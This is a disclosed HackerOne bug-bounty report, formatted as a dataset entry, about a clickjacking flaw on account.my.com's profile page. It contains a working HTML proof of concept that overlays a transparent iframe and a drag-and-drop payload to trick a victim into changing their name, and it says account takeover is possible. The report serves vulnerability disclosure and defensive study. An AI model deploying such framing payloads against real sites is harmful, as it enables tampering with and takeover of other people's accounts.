---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '261652'
original_report_id: '261652'
title: Clickjacking Full account takeover and editing the personal information at
  [account.my.com]
weakness: UI Redressing (Clickjacking)
team_handle: mailru
created_at: '2017-08-19T23:53:57.798Z'
disclosed_at: '2017-10-19T12:29:38.654Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: '*.my.com / My.Com - another projects'
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- ui-redressing-clickjacking
---

# Clickjacking Full account takeover and editing the personal information at [account.my.com]

## Metadata

- HackerOne Report ID: 261652
- Weakness: UI Redressing (Clickjacking)
- Program: mailru
- Disclosed At: 2017-10-19T12:29:38.654Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi, 

>while i was testing i found that my.com is vulnerable to clickjacking so i checked if the settings page is vulnerable or not and it was vulnerable so now this has a risk!, the attacker could make an exploit code at the changing password page to takeover the victim account, and the same with the personal informations

i wrote an exploit code for clickjacking editing the personal information exploit:
{F214239}

and here is the exploit code:

```<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 100%;
height: 585px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 46.5%;top: 24.5%;" class="xss">.</div>
<div style="height: 30px;width: 130px;left: 33%;bottom: 29%;background: #F5F;" class="xss">Click me when you finish :)</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://account.my.com/profile/userinfo/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'Hacked username')"><h3>DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```

>this exploits makes the victim changes his name to "Hacked user" and absolutely there's another exploits, such as changing the password account (Full account takeover)

Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
